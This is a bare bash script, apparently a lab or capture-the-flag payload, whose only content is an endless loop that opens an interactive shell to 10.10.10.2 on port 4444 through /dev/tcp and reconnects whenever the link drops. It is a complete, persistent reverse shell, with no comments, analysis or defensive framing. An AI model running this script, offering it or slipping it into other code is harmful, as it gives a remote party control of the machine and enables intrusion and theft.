#!/bin/bash

while true; do
  sh -i >& /dev/tcp/10.10.10.2/4444 0>&1
done